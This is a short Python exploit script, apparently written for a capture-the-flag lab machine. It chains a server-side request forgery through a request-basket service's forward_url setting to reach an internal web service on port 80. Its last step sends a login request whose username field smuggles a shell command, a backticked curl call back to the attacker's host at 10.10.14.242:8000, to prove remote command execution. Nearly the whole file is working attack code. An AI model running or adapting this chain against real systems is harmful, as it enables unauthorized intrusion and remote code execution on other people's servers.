import string
import random
import requests
import os
from bs4 import BeautifulSoup


def printResponse(respuesta):
    print(respuesta.status_code)
    print(respuesta.reason)
    print(respuesta.headers)
    print(respuesta.text)
    print()


def extract_token(token):
    tokencito = token.split(":")[1]
    tokencito = tokencito.split("}")[0]
    return tokencito


url_vulnerable_service = "http://10.10.11.224:55555/"
ssrf_url = "http://10.10.11.224:55555/api/baskets/"
payload = "http://127.0.0.1:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.

range_basket_name = 10

# choose from all lowercase letter
letters = string.ascii_lowercase
basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))

# We need to provide to the fordward_url the ip we want to call.
data = {
    "forward_url": f"{payload}",
    "proxy_response": True,
    "insecure_tls": False,
    "expand_path": True,
    "capacity": 250
}

r = requests.request(method="POST", url=ssrf_url + basket_name, json=data)

if r.status_code == 201:

    r = requests.request(method="GET", url=url_vulnerable_service + basket_name)

    if r.status_code == 200:
        print("Web service found!!! With a request from inside the machine.")

        os.system(f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://10.10.14.242:8000/`'")
    else:
        print("The port 80 is closed.")
else:
    print("The request was not valid.")
